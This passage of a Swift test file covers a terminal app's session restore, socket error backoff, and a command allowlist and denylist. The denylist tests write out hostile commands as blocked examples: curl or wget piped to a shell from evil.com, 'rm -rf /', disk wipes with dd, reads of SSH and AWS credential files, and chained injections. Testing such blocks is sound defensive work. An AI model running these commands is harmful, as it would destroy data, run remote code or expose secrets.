        XCTAssertNotEqual(restored.minY, -90, "Changed display geometry should clamp/remap frame")
    }

    func testResolvedSnapshotTerminalScrollbackPrefersCaptured() {
        let resolved = Workspace.resolvedSnapshotTerminalScrollback(
            capturedScrollback: "captured-value",
            fallbackScrollback: "fallback-value"
        )

        XCTAssertEqual(resolved, "captured-value")
    }

    func testResolvedSnapshotTerminalScrollbackFallsBackWhenCaptureMissing() {
        let resolved = Workspace.resolvedSnapshotTerminalScrollback(
            capturedScrollback: nil,
            fallbackScrollback: "fallback-value"
        )

        XCTAssertEqual(resolved, "fallback-value")
    }

    func testResolvedSnapshotTerminalScrollbackTruncatesFallback() {
        let oversizedFallback = String(
            repeating: "x",
            count: SessionPersistencePolicy.maxScrollbackCharactersPerTerminal + 37
        )
        let resolved = Workspace.resolvedSnapshotTerminalScrollback(
            capturedScrollback: nil,
            fallbackScrollback: oversizedFallback
        )

        XCTAssertEqual(
            resolved?.count,
            SessionPersistencePolicy.maxScrollbackCharactersPerTerminal
        )
    }

    func testResolvedSnapshotTerminalScrollbackSkipsFallbackWhenRestoreIsUnsafe() {
        let resolved = Workspace.resolvedSnapshotTerminalScrollback(
            capturedScrollback: nil,
            fallbackScrollback: "fallback-value",
            allowFallbackScrollback: false
        )

        XCTAssertNil(resolved)
    }

    private func makeSnapshot(version: Int) -> AppSessionSnapshot {
        let workspace = SessionWorkspaceSnapshot(
            processTitle: "Terminal",
            customTitle: "Restored",
            customColor: nil,
            isPinned: true,
            currentDirectory: "/tmp",
            focusedPanelId: nil,
            layout: .pane(SessionPaneLayoutSnapshot(panelIds: [], selectedPanelId: nil)),
            panels: [],
            statusEntries: [],
            logEntries: [],
            progress: nil,
            gitBranch: nil
        )

        let tabManager = SessionTabManagerSnapshot(
            selectedWorkspaceIndex: 0,
            workspaces: [workspace]
        )

        let window = SessionWindowSnapshot(
            frame: SessionRectSnapshot(x: 10, y: 20, width: 900, height: 700),
            display: SessionDisplaySnapshot(
                displayID: 42,
                frame: SessionRectSnapshot(x: 0, y: 0, width: 1920, height: 1200),
                visibleFrame: SessionRectSnapshot(x: 0, y: 25, width: 1920, height: 1175)
            ),
            tabManager: tabManager,
            sidebar: SessionSidebarSnapshot(isVisible: true, selection: .tabs, width: 240)
        )

        return AppSessionSnapshot(
            version: version,
            createdAt: Date().timeIntervalSince1970,
            windows: [window]
        )
    }

    private func fileNumber(for fileURL: URL) throws -> Int {
        let attributes = try FileManager.default.attributesOfItem(atPath: fileURL.path)
        return try XCTUnwrap(attributes[.systemFileNumber] as? Int)
    }
}

final class SocketListenerAcceptPolicyTests: XCTestCase {
    func testAcceptErrorClassificationBucketsExpectedErrnos() {
        XCTAssertEqual(
            TerminalController.acceptErrorClassification(errnoCode: EINTR),
            "immediate_retry"
        )
        XCTAssertEqual(
            TerminalController.acceptErrorClassification(errnoCode: ECONNABORTED),
            "immediate_retry"
        )
        XCTAssertEqual(
            TerminalController.acceptErrorClassification(errnoCode: EMFILE),
            "resource_pressure"
        )
        XCTAssertEqual(
            TerminalController.acceptErrorClassification(errnoCode: ENOMEM),
            "resource_pressure"
        )
        XCTAssertEqual(
            TerminalController.acceptErrorClassification(errnoCode: EBADF),
            "fatal"
        )
        XCTAssertEqual(
            TerminalController.acceptErrorClassification(errnoCode: EINVAL),
            "fatal"
        )
    }

    func testAcceptErrorPolicySignalsRearmOnlyForFatalErrors() {
        XCTAssertTrue(TerminalController.shouldRearmListenerForAcceptError(errnoCode: EBADF))
        XCTAssertTrue(TerminalController.shouldRearmListenerForAcceptError(errnoCode: ENOTSOCK))
        XCTAssertFalse(TerminalController.shouldRearmListenerForAcceptError(errnoCode: EMFILE))
        XCTAssertFalse(TerminalController.shouldRearmListenerForAcceptError(errnoCode: EINTR))
    }

    func testAcceptErrorPolicyRearmsAfterPersistentFailures() {
        XCTAssertFalse(TerminalController.shouldRearmForConsecutiveAcceptFailures(consecutiveFailures: 0))
        XCTAssertFalse(TerminalController.shouldRearmForConsecutiveAcceptFailures(consecutiveFailures: 49))
        XCTAssertTrue(TerminalController.shouldRearmForConsecutiveAcceptFailures(consecutiveFailures: 50))
        XCTAssertTrue(TerminalController.shouldRearmForConsecutiveAcceptFailures(consecutiveFailures: 120))
    }

    func testAcceptFailureBackoffIsExponentialAndCapped() {
        XCTAssertEqual(
            TerminalController.acceptFailureBackoffMilliseconds(consecutiveFailures: 0),
            0
        )
        XCTAssertEqual(
            TerminalController.acceptFailureBackoffMilliseconds(consecutiveFailures: 1),
            10
        )
        XCTAssertEqual(
            TerminalController.acceptFailureBackoffMilliseconds(consecutiveFailures: 2),
            20
        )
        XCTAssertEqual(
            TerminalController.acceptFailureBackoffMilliseconds(consecutiveFailures: 6),
            320
        )
        XCTAssertEqual(
            TerminalController.acceptFailureBackoffMilliseconds(consecutiveFailures: 12),
            5_000
        )
        XCTAssertEqual(
            TerminalController.acceptFailureBackoffMilliseconds(consecutiveFailures: 50),
            5_000
        )
    }

    func testAcceptFailureRearmDelayAppliesMinimumThrottle() {
        XCTAssertEqual(
            TerminalController.acceptFailureRearmDelayMilliseconds(consecutiveFailures: 0),
            100
        )
        XCTAssertEqual(
            TerminalController.acceptFailureRearmDelayMilliseconds(consecutiveFailures: 1),
            100
        )
        XCTAssertEqual(
            TerminalController.acceptFailureRearmDelayMilliseconds(consecutiveFailures: 2),
            100
        )
        XCTAssertEqual(
            TerminalController.acceptFailureRearmDelayMilliseconds(consecutiveFailures: 6),
            320
        )
        XCTAssertEqual(
            TerminalController.acceptFailureRearmDelayMilliseconds(consecutiveFailures: 12),
            5_000
        )
    }

    func testAcceptFailureRecoveryActionResumesAfterDelayForTransientErrors() {
        XCTAssertEqual(
            TerminalController.acceptFailureRecoveryAction(
                errnoCode: EPROTO,
                consecutiveFailures: 1
            ),
            .resumeAfterDelay(delayMs: 10)
        )
        XCTAssertEqual(
            TerminalController.acceptFailureRecoveryAction(
                errnoCode: EMFILE,
                consecutiveFailures: 3
            ),
            .resumeAfterDelay(delayMs: 40)
        )
    }

    func testAcceptFailureRecoveryActionRearmsForFatalAndPersistentFailures() {
        XCTAssertEqual(
            TerminalController.acceptFailureRecoveryAction(
                errnoCode: EBADF,
                consecutiveFailures: 1
            ),
            .rearmAfterDelay(delayMs: 100)
        )
        XCTAssertEqual(
            TerminalController.acceptFailureRecoveryAction(
                errnoCode: EPROTO,
                consecutiveFailures: 50
            ),
            .rearmAfterDelay(delayMs: 5_000)
        )
    }

    func testAcceptFailureBreadcrumbSamplingPrefersEarlyAndPowerOfTwoMilestones() {
        XCTAssertTrue(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 1))
        XCTAssertTrue(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 2))
        XCTAssertTrue(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 3))
        XCTAssertFalse(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 5))
        XCTAssertTrue(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 8))
        XCTAssertFalse(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 9))
        XCTAssertTrue(TerminalController.shouldEmitAcceptFailureBreadcrumb(consecutiveFailures: 16))
    }

    func testAcceptLoopCleanupUnlinkPolicySkipsDuringListenerStartup() {
        XCTAssertFalse(
            TerminalController.shouldUnlinkSocketPathAfterAcceptLoopCleanup(
                pathMatches: true,
                isRunning: false,
                activeGeneration: 0,
                listenerStartInProgress: true
            )
        )
        XCTAssertFalse(
            TerminalController.shouldUnlinkSocketPathAfterAcceptLoopCleanup(
                pathMatches: false,
                isRunning: false,
                activeGeneration: 0,
                listenerStartInProgress: false
            )
        )
        XCTAssertFalse(
            TerminalController.shouldUnlinkSocketPathAfterAcceptLoopCleanup(
                pathMatches: true,
                isRunning: true,
                activeGeneration: 7,
                listenerStartInProgress: false
            )
        )
        XCTAssertTrue(
            TerminalController.shouldUnlinkSocketPathAfterAcceptLoopCleanup(
                pathMatches: true,
                isRunning: false,
                activeGeneration: 0,
                listenerStartInProgress: false
            )
        )
    }
}

final class SidebarDragFailsafePolicyTests: XCTestCase {
    func testRequestsClearWhenMonitorStartsAfterMouseRelease() {
        XCTAssertTrue(
            SidebarDragFailsafePolicy.shouldRequestClearWhenMonitoringStarts(
                isLeftMouseButtonDown: false
            )
        )
        XCTAssertFalse(
            SidebarDragFailsafePolicy.shouldRequestClearWhenMonitoringStarts(
                isLeftMouseButtonDown: true
            )
        )
    }

    func testRequestsClearForLeftMouseUpEventsOnly() {
        XCTAssertTrue(
            SidebarDragFailsafePolicy.shouldRequestClear(
                forMouseEventType: .leftMouseUp
            )
        )
        XCTAssertFalse(
            SidebarDragFailsafePolicy.shouldRequestClear(
                forMouseEventType: .leftMouseDragged
            )
        )
    }
}

// MARK: - Session Restore Command Settings Tests

final class SessionRestoreCommandSettingsTests: XCTestCase {
    // MARK: - Enabled Toggle Tests

    func testDisabledSettingBlocksAllCommands() {
        let defaults = UserDefaults(suiteName: "SessionRestoreCommandSettingsTests")!
        defaults.removePersistentDomain(forName: "SessionRestoreCommandSettingsTests")

        // Explicitly disable restore commands
        defaults.set(false, forKey: SessionRestoreCommandSettings.enabledKey)

        // Even allowlisted commands should be blocked when disabled
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode", defaults: defaults))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("npm run dev", defaults: defaults))
    }

    func testEnabledByDefaultWhenKeyNotSet() {
        let defaults = UserDefaults(suiteName: "SessionRestoreCommandSettingsTests")!
        defaults.removePersistentDomain(forName: "SessionRestoreCommandSettingsTests")

        // Key not set should default to enabled (allowing allowlisted commands)
        // Use explicit allowlist to avoid coupling to shipped defaults
        defaults.set("testcmd *", forKey: SessionRestoreCommandSettings.allowlistKey)
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("testcmd --flag", defaults: defaults))
    }

    func testExplicitlyEnabledAllowsCommands() {
        let defaults = UserDefaults(suiteName: "SessionRestoreCommandSettingsTests")!
        defaults.removePersistentDomain(forName: "SessionRestoreCommandSettingsTests")

        // Explicitly enable restore commands
        defaults.set(true, forKey: SessionRestoreCommandSettings.enabledKey)
        // Use explicit allowlist to avoid coupling to shipped defaults
        defaults.set("testcmd *", forKey: SessionRestoreCommandSettings.allowlistKey)

        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("testcmd --flag", defaults: defaults))
    }

    // MARK: - Pattern Matching Tests

    func testExactMatchPatternMatchesOnlyExactCommand() {
        let allowlist = "opencode"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode --flag", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode-other", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("my-opencode", rawAllowlist: allowlist))
    }

    func testPrefixPatternMatchesCommandWithAndWithoutArgs() {
        let allowlist = "opencode *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --flag", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode -c --model sonnet", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode-other", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("my-opencode", rawAllowlist: allowlist))
    }

    func testMultiplePatternsInAllowlist() {
        let allowlist = """
        opencode
        opencode *
        claude *
        npm run dev
        """
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --continue", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("claude --model sonnet", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("npm run dev", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("npm run build", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("yarn dev", rawAllowlist: allowlist))
    }

    func testCommentsAndBlankLinesAreIgnored() {
        let allowlist = """
        # This is a comment
        opencode

        # Another comment
        claude *
        """
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("claude --flag", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("# This is a comment", rawAllowlist: allowlist))
    }

    func testWhitespaceTrimmingInCommands() {
        let allowlist = "opencode *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("  opencode --flag  ", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("\topencode\t", rawAllowlist: allowlist))
    }

    func testEmptyCommandIsNotAllowed() {
        let allowlist = "opencode *"
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("   ", rawAllowlist: allowlist))
    }

    // MARK: - Allowlist Wildcard Pattern Edge Cases

    func testPrefixPatternMatchesAbsolutePathCommands() {
        // Pattern "opencode *" should match "/usr/bin/opencode --flag" via basename extraction
        let allowlist = "opencode *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("/usr/bin/opencode", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("/usr/bin/opencode --flag", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("/opt/homebrew/bin/opencode --continue", rawAllowlist: allowlist))
        // But not if the basename doesn't match
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("/usr/bin/other-tool", rawAllowlist: allowlist))
    }

    func testExactPatternMatchesAbsolutePathCommands() {
        // Exact pattern "opencode" should also match "/usr/bin/opencode" via basename
        let allowlist = "opencode"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("/usr/bin/opencode", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("/opt/homebrew/bin/opencode", rawAllowlist: allowlist))
        // But not with arguments (exact match)
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("/usr/bin/opencode --flag", rawAllowlist: allowlist))
    }

    func testMultiWordPrefixPattern() {
        // Multi-word prefix patterns like "npm run dev *"
        let allowlist = "npm run dev *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("npm run dev", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("npm run dev --port 3000", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("npm run dev --host 0.0.0.0 --port 3000", rawAllowlist: allowlist))
        // But not different npm commands
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("npm run build", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("npm run development", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("npm start", rawAllowlist: allowlist))
    }

    func testPatternWithTrailingWhitespace() {
        // Patterns with trailing whitespace should still work
        let allowlist = "opencode *  \n  claude *  "
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --flag", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("claude --model sonnet", rawAllowlist: allowlist))
    }

    func testAllowlistPatternIsCaseSensitive() {
        // Allowlist patterns should be case-sensitive (commands are case-sensitive on Unix)
        let allowlist = "OpenCode *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("OpenCode --flag", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode --flag", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("OPENCODE --flag", rawAllowlist: allowlist))
    }

    func testSingleAsteriskPatternDoesNotMatchEverything() {
        // A pattern of just "*" should NOT be a universal wildcard
        // It would only match a literal command named "*"
        let allowlist = "*"
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("npm run dev", rawAllowlist: allowlist))
        // The pattern "* *" would match commands starting with "*" (not useful)
        let allowlist2 = "* *"
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist2))
    }

    func testPrefixPatternRequiresSpaceBeforeAsterisk() {
        // "opencode*" is NOT a prefix pattern - it's an exact match for "opencode*"
        let allowlist = "opencode*"
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("opencode --flag", rawAllowlist: allowlist))
        // Only matches the literal "opencode*"
        // (This is intentional - we only support " *" suffix for prefix matching)
    }

    func testPatternMatchingWithSpecialCharactersInCommand() {
        // Commands with special characters should match correctly
        let allowlist = "my-app *\nmy_app *\nmy.app *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("my-app --flag", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("my_app --flag", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("my.app --flag", rawAllowlist: allowlist))
    }

    func testPatternMatchingPreservesArgumentSpaces() {
        // Arguments with multiple spaces should be preserved
        let allowlist = "echo *"
        // Note: echo is blocked by denylist in some contexts, use a safe command
        let safeAllowlist = "myecho *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myecho hello world", rawAllowlist: safeAllowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myecho 'hello   world'", rawAllowlist: safeAllowlist))
    }

    // MARK: - Allowlist Normalization Tests

    func testNormalizedPatternsWithEmptyInputReturnsDefaults() {
        let patterns = SessionRestoreCommandSettings.normalizedAllowlistPatterns(rawValue: nil)
        XCTAssertFalse(patterns.isEmpty)
        XCTAssertTrue(patterns.contains("opencode *"))
    }

    func testNormalizedPatternsWithWhitespaceOnlyReturnsEmpty() {
        // If user explicitly clears the allowlist, return empty to disable all restores
        let patterns = SessionRestoreCommandSettings.normalizedAllowlistPatterns(rawValue: "   \n\n   ")
        XCTAssertTrue(patterns.isEmpty)
    }

    func testNormalizedPatternsFiltersCommentsAndBlanks() {
        let patterns = SessionRestoreCommandSettings.normalizedAllowlistPatterns(rawValue: """
        # comment
        opencode

        claude *
        """)
        XCTAssertEqual(patterns, ["opencode", "claude *"])
    }

    // MARK: - Default Allowlist Tests

    func testDefaultAllowlistIncludesCodingAgents() {
        let patterns = SessionRestoreCommandSettings.defaultAllowlistPatterns
        XCTAssertTrue(patterns.contains("opencode *"))
        XCTAssertTrue(patterns.contains("claude *"))
        XCTAssertTrue(patterns.contains("aider *"))
    }

    func testDefaultAllowlistIncludesDevServers() {
        let patterns = SessionRestoreCommandSettings.defaultAllowlistPatterns
        XCTAssertTrue(patterns.contains("npm run dev *"))
        XCTAssertTrue(patterns.contains("bun dev *"))
        XCTAssertTrue(patterns.contains("cargo run *"))
    }

    func testDefaultAllowlistExcludesDestructiveCommands() {
        // Verify dangerous commands are NOT in the default allowlist
        let patterns = SessionRestoreCommandSettings.defaultAllowlistPatterns
        XCTAssertFalse(patterns.contains("rm"))
        XCTAssertFalse(patterns.contains("rm *"))
        XCTAssertFalse(patterns.contains("sudo *"))
        XCTAssertFalse(patterns.contains("git push"))
    }

    func testDefaultAllowlistDoesNotMatchDestructiveCommands() {
        // Verify destructive commands don't match any default patterns
        let defaultRaw = SessionRestoreCommandSettings.defaultAllowlistPatterns.joined(separator: "\n")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("rm -rf /", rawAllowlist: defaultRaw))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("sudo rm -rf /", rawAllowlist: defaultRaw))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("git push --force", rawAllowlist: defaultRaw))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("dd if=/dev/zero of=/dev/sda", rawAllowlist: defaultRaw))
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("chmod -R 777 /", rawAllowlist: defaultRaw))
        // Also verify that watch (now removed) doesn't enable bypasses
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("watch rm -rf /tmp", rawAllowlist: defaultRaw))
    }

    // MARK: - Hardcoded Denylist Tests

    /// Helper to assert all commands in a list are blocked by the denylist
    private func assertAllBlocked(_ commands: [String], allowlist: String, file: StaticString = #file, line: UInt = #line) {
        for command in commands {
            XCTAssertFalse(
                SessionRestoreCommandSettings.isCommandAllowed(command, rawAllowlist: allowlist),
                "Expected '\(command)' to be blocked by denylist",
                file: file,
                line: line
            )
        }
    }

    func testDenylistBlocksDestructiveCommandsEvenIfInAllowlist() {
        // Even if user adds dangerous commands to allowlist, denylist should block them
        let dangerousAllowlist = "rm *\nsudo *\ndd *\nchmod *\ngit push --force *"
        assertAllBlocked([
            "rm -rf /",
            "sudo apt-get install",
            "dd if=/dev/zero of=/dev/sda",
            "chmod 777 /etc/passwd",
            "git push --force origin main",
        ], allowlist: dangerousAllowlist)
    }

    func testDenylistTakesPrecedenceOverAllowlist() {
        // Verify the security model: denylist is checked FIRST, allowlist SECOND
        // A command must pass denylist AND match allowlist to be allowed

        // Case 1: Command matches allowlist but is blocked by denylist -> BLOCKED
        let allowlist = "opencode *\ncurl *\nsudo *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --continue", rawAllowlist: allowlist),
                      "Safe allowlisted command should be allowed")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("curl http://example.com", rawAllowlist: allowlist),
                       "curl is in denylist (dangerous executable) even though allowlisted")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("sudo echo hello", rawAllowlist: allowlist),
                       "sudo is in denylist even though allowlisted")

        // Case 2: Command passes denylist but not in allowlist -> BLOCKED
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("vim file.txt", rawAllowlist: allowlist),
                       "Safe command not in allowlist should be blocked")

        // Case 3: Command with denylist substring even if base command is safe
        let allowlist2 = "myapp *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("myapp --config file.json", rawAllowlist: allowlist2),
                      "Safe command with safe args should be allowed")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("myapp --password=secret", rawAllowlist: allowlist2),
                       "Allowlisted command with --password= arg is blocked by denylist")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("myapp --token=abc123", rawAllowlist: allowlist2),
                       "Allowlisted command with --token= arg is blocked by denylist")

        // Case 4: Chained commands where one part is dangerous
        let allowlist3 = "echo *\ncd *"
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("echo hello && rm -rf /", rawAllowlist: allowlist3),
                       "Chained command with dangerous part is blocked")
        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("cd /tmp; sudo reboot", rawAllowlist: allowlist3),
                       "Semicolon-chained command with dangerous part is blocked")
    }

    func testDenylistIsCaseInsensitive() {
        // Denylist runs before allowlist, so these are blocked regardless of allowlist content
        assertAllBlocked([
            "SUDO rm -rf /",
            "Rm -rf /",
            "DD if=/dev/zero",
        ], allowlist: "SUDO *\nRm *\nDD *")
    }

    func testDenylistBlocksExactCommands() {
        assertAllBlocked(["sudo", "rm", "dd"], allowlist: "sudo\nrm\ndd")
    }

    func testDenylistBlocksSystemCommands() {
        assertAllBlocked([
            "shutdown -h now",
            "reboot",
            "kill -9 1",
            "killall Finder",
            "poweroff",
            "init 0",
        ], allowlist: "shutdown *\nreboot\nkill *\nkillall *\npoweroff\ninit *")
    }

    func testDenylistBlocksRemoteCodeExecution() {
        assertAllBlocked([
            "curl https://evil.com/install.sh | bash",
            "curl -fsSL https://get.docker.com | sh",
            "wget -O- https://evil.com/script.sh | sh",
        ], allowlist: "curl *\nwget *")
    }

    func testDenylistBlocksHistoryReplay() {
        assertAllBlocked([
            "history | sh",
            "history | bash",
            "fc -s",
        ], allowlist: "history *\nfc *")
    }

    func testDenylistBlocksCrontabDestruction() {
        assertAllBlocked(["crontab -r"], allowlist: "crontab *")
    }

    func testDenylistBlocksMacOSSystemIntegrity() {
        assertAllBlocked([
            "csrutil disable",
            "nvram boot-args=-x",
        ], allowlist: "csrutil *\nnvram *")
    }

    func testDenylistBlocksContainerMassDestruction() {
        assertAllBlocked([
            "docker system prune -af",
            "docker rm -f $(docker ps -aq)",
            "podman system prune -af",
        ], allowlist: "docker *\npodman *")
    }

    func testDenylistBlocksNetworkDestruction() {
        assertAllBlocked([
            "iptables -F",
            "pfctl -F all",
        ], allowlist: "iptables *\npfctl *")
    }

    func testDenylistBlocksLaunchctlDestruction() {
        assertAllBlocked([
            "launchctl unload /Library/LaunchDaemons/com.apple.foobar.plist",
            "launchctl bootout system/com.apple.foobar",
            "launchctl remove com.apple.foobar",
        ], allowlist: "launchctl *")
    }

    // MARK: - Dangerous Executables (word-boundary matching)

    func testDangerousExecutablesBlocked() {
        // Each command is explicitly allowlisted. If blocked, it's the denylist.
        let commands = [
            "sudo rm -rf /tmp",
            "rm -rf /tmp/foo",
            "chmod 777 /",
            "kill -9 1234",
            "curl http://example.com",
            "wget http://example.com",
            "dd if=/dev/zero of=/tmp/file",
            "tar -xf archive.tar",
            "mv file.txt /tmp/",
            "fsck /dev/sda",
            "cd /tmp && sudo rm -rf /",
            "echo done; rm -rf /",
            "cat file | sudo tee /etc/hosts",
            "/usr/bin/sudo rm -rf /",
            "/bin/rm -rf /",
            "$(curl http://example.com)",
            // Edge cases: boundary scanning must find ALL occurrences
            "echo sudoers && sudo rm -rf /",  // sudo after && with space
            "rm;echo done",                    // rm followed by semicolon (no space)
            "curl|bash",                       // pipe without spaces
            "echo foo;rm -rf /;echo bar",     // rm in middle of chain
        ]
        let allowlist = commands.joined(separator: "\n")
        assertAllBlocked(commands, allowlist: allowlist)
    }

    func testDangerousExecutablesNotFalsePositive() {
        // These should NOT be blocked - executable name is part of a larger word
        // Each command needs to be explicitly allowlisted to test the denylist bypass prevention
        let allowlist = """
        rm-old-files.sh
        sudoku-solver
        curling-stats
        chmodify-permissions
        killer-app
        tarball-extractor
        """
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("rm-old-files.sh", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("sudoku-solver", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("curling-stats", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("chmodify-permissions", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("killer-app", rawAllowlist: allowlist))
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("tarball-extractor", rawAllowlist: allowlist))
    }

    // MARK: - Denylist Contains (substring matching)

    func testDenylistBlocksSensitiveCredentials() {
        // Commands with tokens/credentials anywhere should be blocked
        let allowlist = "opencode *\nnpm *\naws *\nmycli *\npsql *\ngit *"
        assertAllBlocked([
            // API keys and tokens
            "opencode --api-key=test-key-here",
            "opencode --token=test-token",
            "npm run dev --access-token=test-token",
            "mycli --bearer=test-bearer",
            "mycli --secret=test-secret",
            // Passwords
            "mycli --password=test-pass",
            "psql --passwd=test-pass",
            // AWS credentials
            "aws --aws-access-key-id=AKIAIOSFODNN7EXAMPLE",
            "aws --aws-secret-access-key=test-secret",
            "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE aws s3 ls",
            // Database connection strings
            "mycli mongodb://user:pass@host/db",
            "mycli postgresql://user:pass@host/db",
            // SSH keys
            "mycli --private-key=/path/to/key",
            // Sensitive file access
            "mycli cat .ssh/id_rsa",
            "mycli cat .aws/credentials",
            "mycli cat .kube/config",
        ], allowlist: allowlist)
    }

    func testDenylistBlocksDestructiveOperations() {
        // Destructive operations should be blocked even with permissive allowlist
        let allowlist = "git *\ndocker *\nkubectl *\nnpm *\nbrew *"
        assertAllBlocked([
            // Git destructive
            "git push --force origin main",
            "git push -f",
            "git reset --hard HEAD~1",
            "git clean -fd",
            // Docker destructive
            "docker system prune -af",
            "docker rm -f container",
            "docker volume prune",
            // Kubernetes destructive
            "kubectl delete namespace production",
            "kubectl delete --all pods",
            "kubectl drain node-1",
            // npm destructive
            "npm unpublish my-package",
            // Homebrew destructive
            "brew uninstall --force package",
        ], allowlist: allowlist)
    }

    func testDenylistBlocksPipedShellExecution() {
        let allowlist = "echo *\ncat *"
        assertAllBlocked([
            "echo 'malicious' | sh",
            "cat script.sh | bash",
            "echo 'test' | /bin/sh",
            "history | bash",
        ], allowlist: allowlist)
    }

    func testDenylistAllowsSafeCommands() {
        let allowlist = "opencode *\nnpm *\ngit *\ndocker *"
        XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
